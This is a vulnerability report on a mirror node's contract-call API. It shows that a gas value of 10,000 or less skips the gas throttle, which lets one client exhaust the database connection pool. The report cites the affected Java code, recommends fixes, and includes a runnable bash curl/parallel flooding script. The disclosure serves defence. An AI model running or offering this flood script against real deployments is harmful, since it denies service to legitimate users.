### Title
Historical Contract Call Thundering Herd via Gas Throttle Bypass Saturates DB Connection Pool

### Summary
The `findActiveByEvmAddressAndTimestamp()` method executes an uncached CTE + UNION ALL query against both `entity` and `entity_history` tables on every invocation. An unprivileged attacker can bypass the gas-based throttle entirely by supplying `gas ≤ 10,000` (which causes `scaleGas()` to return `0`, always passing `tryConsume(0)`), then flood the global 500 req/s rate limit with historical calls using distinct `blockTimestamp` values, saturating the HikariCP connection pool and degrading service for all users.

### Finding Description

**Exact code location:**
- `web3/src/main/java/org/hiero/mirror/web3/repository/EntityRepository.java`, lines 59–85: `findActiveByEvmAddressAndTimestamp()` — no `@Cacheable` annotation; every invocation issues a native CTE + UNION ALL query to the database.
- `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java`, lines 42–47: `scaleGas()` returns `0L` for any `gas <= 10_000`.
- `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, line 40: `gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))` — consuming 0 tokens always succeeds in bucket4j.
- `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java`, line 35: global `requestsPerSecond = 500` (not per-IP).

**Root cause and failed assumption:**

The design assumes the gas-based throttle will bound DB load from historical calls. This assumption fails because `scaleGas(gas)` returns `0` for `gas ≤ 10_000`, making `tryConsume(0)` a no-op that always succeeds. The only remaining guard is the global 500 req/s RPS bucket — which is not per-IP and can be monopolized by a single attacker.

`findActiveByEvmAddressAndTimestamp()` carries no `@Cacheable` annotation (contrast with `findByEvmAddressAndDeletedIsFalse` at line 37 which is cached). Varying `blockTimestamp` across requests guarantees zero cache reuse. Each request therefore issues a full CTE + UNION ALL scan of `entity` and `entity_history`.

**Exploit flow:**

1. Attacker crafts a POST `/api/v1/contracts/call` request with `block` set to any historical block number, `gas = 10000` (≤ `GAS_SCALE_FACTOR`), and a valid EVM address in `to`.
2. `ThrottleManagerImpl.throttle()` checks `rateLimitBucket.tryConsume(1)` (passes, up to 500/s) then `gasLimitBucket.tryConsume(scaleGas(10000))` = `tryConsume(0)` — always passes.
3. The request reaches `CommonEntityAccessor.getEntityByEvmAddressTimestamp()` → `entityRepository.findActiveByEvmAddressAndTimestamp(addressBytes, t)`.
4. PostgreSQL executes the CTE + UNION ALL query against `entity` and `entity_history`.
5. Attacker repeats at 500 req/s (the global ceiling), each with a distinct `blockTimestamp`, ensuring no cache hits.
6. With HikariCP's default pool size (~10 connections) and each query potentially running for hundreds of milliseconds (up to the 3,000 ms `statementTimeout`), the pool is exhausted. Legitimate requests queue or fail with connection timeout errors.

**Why existing checks are insufficient:**

- Gas throttle: bypassed entirely for `gas ≤ 10,000`.
- RPS throttle: global, not per-IP; a single attacker consumes the full 500 req/s budget.
- Statement timeout (3,000 ms): limits individual query duration but does not prevent concurrent saturation — 500 in-flight queries × 3 s each far exceeds any realistic pool size.
- Caching: absent on `findActiveByEvmAddressAndTimestamp()`; varying `blockTimestamp` defeats any hypothetical future cache.

### Impact Explanation

All users of the `/api/v1/contracts/call` endpoint experience degraded or unavailable service while the attack is active. The HikariCP connection pool is exhausted, causing legitimate requests to queue indefinitely or fail. No funds are at risk; the impact is pure service availability (griefing), consistent with the stated Medium severity scope.

### Likelihood Explanation

The attack requires no credentials, no on-chain assets, and no special knowledge beyond the public API. Any HTTP client capable of 500 req/s (trivially achievable from a single machine or small botnet) can execute it. The exploit is repeatable and sustainable indefinitely. The only cost to the attacker is outbound bandwidth for HTTP requests with minimal payloads.

### Recommendation

1. **Fix the gas throttle bypass**: Change `scaleGas()` to return a minimum of `1` for any positive gas value, or enforce a minimum gas floor (e.g., `21,000`) at the API validation layer so `tryConsume(0)` is never reached.
2. **Add per-IP rate limiting**: Introduce a per-source-IP bucket (e.g., via a servlet filter or gateway policy) so a single client cannot monopolize the global RPS budget.
3. **Add caching for historical queries**: Apply a short-lived cache (keyed on `(evmAddress, blockTimestamp)`) to `findActiveByEvmAddressAndTimestamp()` to absorb repeated identical queries.
4. **Bound DB concurrency**: Configure a semaphore or queue in front of historical DB queries to cap the number of simultaneous CTE + UNION ALL executions regardless of RPS.

### Proof of Concept

```bash
# Requires: curl, GNU parallel or similar
# Replace CONTRACT_ADDRESS with any known EVM address
# Replace HISTORICAL_BLOCK with a valid historical block number

BASE_URL="https://<mirror-node-host>"
CONTRACT="0xabcdef1234567890abcdef1234567890abcdef12"

flood() {
  BLOCK=$((1000000 + RANDOM))   # distinct blockTimestamp per request
  curl -s -o /dev/null -X POST "$BASE_URL/api/v1/contracts/call" \
    -H "Content-Type: application/json" \
    -d "{\"to\":\"$CONTRACT\",\"gas\":10000,\"block\":\"$BLOCK\",\"data\":\"0x\"}"
}

export -f flood
export BASE_URL CONTRACT

# Fire 500 concurrent requests per second
seq 1 500 | parallel -j500 flood
```

Expected result: after a few seconds, legitimate `/api/v1/contracts/call` requests begin returning HTTP 503 or connection timeout errors as the HikariCP pool is exhausted. The attacker's own requests also begin timing out once the pool is saturated, confirming pool exhaustion. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/EntityRepository.java (L59-85)
```java
    @Query(value = """
            with entity_cte as (
                select id
                from entity
                where evm_address = ?1 and created_timestamp <= ?2
                order by created_timestamp desc
                limit 1
            )
            (
                select *
                from entity e
                where e.deleted is not true
                and e.id = (select id from entity_cte)
            )
            union all
            (
                select *
                from entity_history eh
                where lower(eh.timestamp_range) <= ?2
                and eh.id = (select id from entity_cte)
                order by lower(eh.timestamp_range) desc
                limit 1
            )
            order by timestamp_range desc
            limit 1
            """, nativeQuery = true)
    Optional<Entity> findActiveByEvmAddressAndTimestamp(byte[] evmAddress, long blockTimestamp);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L34-35)
```java
    @Min(1)
    private long requestsPerSecond = 500;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L42-47)
```java
    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```
